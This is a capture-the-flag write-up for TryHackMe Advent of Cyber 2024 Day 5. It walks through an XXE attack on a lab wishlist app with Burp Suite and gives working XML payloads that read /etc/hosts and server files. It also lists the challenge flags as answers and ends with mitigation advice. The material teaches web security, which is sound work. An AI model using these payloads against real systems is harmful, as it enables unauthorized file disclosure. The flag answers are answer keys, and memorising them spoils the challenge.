# 🎄 TryHackMe Advent of Cyber 2024 – Day 5: XXE Exploitation Challenge

## Challenge Overview 🎅

Day 5 takes us into the world of **XML External Entity (XXE) vulnerabilities**, highlighting how improper XML parsing can expose sensitive information or allow attackers to perform malicious actions. In this challenge, we exploit a vulnerability in Wareville's Christmas wishlist application, uncover hidden data, and investigate signs of possible sabotage in the development process.

## Objectives 🎯

1. Understand how XML and entities work to uncover the root cause of XXE vulnerabilities.
2. Exploit the XXE vulnerability to access restricted files.
3. Investigate and confirm suspicious modifications in the application's development history.

## Key Concepts 💡

### What is XML?
XML (eXtensible Markup Language) is a standardized way for systems to exchange structured data. Tags like `<name>` and `<address>` help organize the data into a human- and machine-readable format.

### Entities in XML
Entities act like placeholders in XML and can be used to:
- Repeat or reference internal data.
- Load external data or files using URLs.

### What is XXE?
XXE (XML External Entity) vulnerabilities occur when an XML parser fails to restrict the resolution of external entities, enabling attackers to:
- Access sensitive files (e.g., `/etc/passwd`).
- Send malicious requests to backend systems.
- Perform denial-of-service (DoS) or even remote code execution.

## Step 1: Identifying the XXE Vulnerability

### Setting Up Burp Suite
1. **Install Burp Suite:**
   - Launch Burp Suite. You can download it [here](https://portswigger.net/burp).
2. **Navigate to the Website:**
   - Open Burp's pre-configured browser and visit `http://MACHINE_IP/product.php`.
3. **Add a Product to the Wishlist:**
   - Click "Add to Wishlist" for a product, and intercept the request using Burp Suite's **Proxy** tab.

### Crafting the Payload
1. **Intercept the Request:**
   - The request sends XML like this:
     ```
     <wishlist>
       <user_id>1</user_id>
       <item>
         <product_id>1</product_id>
       </item>
     </wishlist>
     ```
2. **Modify the Payload:**
   - Replace the `<product_id>` tag with a reference to an external entity:
     ```
     <!--?xml version="1.0"?-->
     <!DOCTYPE foo [<!ENTITY payload SYSTEM "/etc/hosts"> ]>
     <wishlist>
       <user_id>1</user_id>
       <item>
         <product_id>&payload;</product_id>
       </item>
     </wishlist>
     ```
3. **Send the Updated Request:**
   - Use Burp Suite’s **Repeater** tab to send the modified request and observe the response. The response confirms access to `/etc/hosts`, validating the XXE vulnerability.
   - 
## Step 2: Exploiting the XXE Vulnerability

### Accessing Sensitive Files
1. **Target a Specific File:**
   - Update the payload to read from `/var/www/html/wishes/`:
     ```
     <!--?xml version="1.0"?-->
     <!DOCTYPE foo [<!ENTITY payload SYSTEM "/var/www/html/wishes/wish_1.txt"> ]>
     <wishlist>
       <user_id>1</user_id>
       <item>
         <product_id>&payload;</product_id>
       </item>
     </wishlist>
     ```
2. **Iterate Through Wishes:**
   - Change the file name incrementally (e.g., `wish_2.txt`, `wish_3.txt`) to discover additional wishes.

### Discovering the Flag
- On `wish_15.txt`, the response reveals:
  ```
  The product ID: Wish #15
  Name: Mayor Malware
  Address: Test
  ---------------------------------------
  Product: Waredy Cane
  Quantity: 1
  ---------------------------------------
  PS: The flag is THM{Brut3f0rc1n6_mY_w4y}
  ```

**Answer: `THM{Brut3f0rc1n6_mY_w4y}`**

## Step 3: Investigating the Sabotage

### Accessing the CHANGELOG
1. **Navigate to the Changelog:**
   - Visit `http://MACHINE_IP/CHANGELOG` directly.
2. **Review the Entries:**
   - The changelog reveals that a recent push introduced the vulnerable XML parser code. This evidence points to potential sabotage by Mayor Malware.

**Answer: `THM{m4y0r_m4lw4r3_b4ckd00rs}`**

## Lessons Learned 🌟

### Takeaways on XXE Exploitation
1. **Understanding XML and Entities:**
   - XML is powerful for structured data exchange but can pose security risks without proper validation.
2. **How XXE Exploitation Works:**
   - Injecting malicious entities into XML allows attackers to access restricted files or interact with backend systems.

### Mitigation Strategies
1. **Disable External Entity Loading:**
   - In PHP, use `libxml_disable_entity_loader(true)` to prevent external entities from being resolved.
2. **Validate and Sanitize Input:**
   - Ensure only expected XML structures are processed, blocking references to sensitive paths like `/etc/hosts`.
3. **Conduct Regular Security Audits:**
   - Review applications for vulnerabilities before deploying them to production.

## Tools Used 🛠️

1. **[Burp Suite](https://portswigger.net/burp):** Intercepted and modified HTTP requests to identify and exploit the XXE vulnerability.
2. **XML:** Crafted payloads to exploit the vulnerability.
3. **Browser:** Accessed the application and verified exploitation outcomes.

## Final Thoughts 🎁

Day 5’s challenge demonstrated the critical importance of secure coding and validation practices. By leveraging improperly sanitized XML parsing, we accessed sensitive information and uncovered sabotage evidence. This challenge reinforced:
- The dangers of XXE vulnerabilities in real-world applications.
- The need for thorough security testing during development.
- The importance of developer awareness regarding secure coding practices.

By addressing these lessons, developers and organizations can prevent vulnerabilities like XXE from becoming a real-world threat.

## Questions and Answers

1. **What is the flag discovered after navigating through the wishes?**  
   **Answer:** `THM{Brut3f0rc1n6_mY_w4y}`

2. **What is the flag seen on the possible proof of sabotage?**  
   **Answer:** `THM{m4y0r_m4lw4r3_b4ckd00rs}`

## Table of Contents 📚

- [Day 1: OPSEC Challenge](day1.md)
- [Day 2: Log Analysis](day2.md)
- [Day 3: Log Analysis](day3.md)
- [Day 4: Atomic Red Team](day4.md)
- [Day 6: Sandboxes](day6.md)
- [Day 7: AWS Sandboxes](day7.md)
- [More Days to Come!](README.md)
```
